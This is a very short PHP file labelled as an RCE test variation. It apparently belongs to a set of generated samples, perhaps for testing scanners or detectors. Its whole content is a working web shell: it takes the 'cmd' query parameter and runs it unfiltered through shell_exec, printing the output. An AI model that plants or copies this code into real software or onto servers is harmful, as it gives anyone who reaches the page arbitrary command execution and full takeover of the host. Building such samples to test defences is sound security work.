<?php
// RCE test variation #1253
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>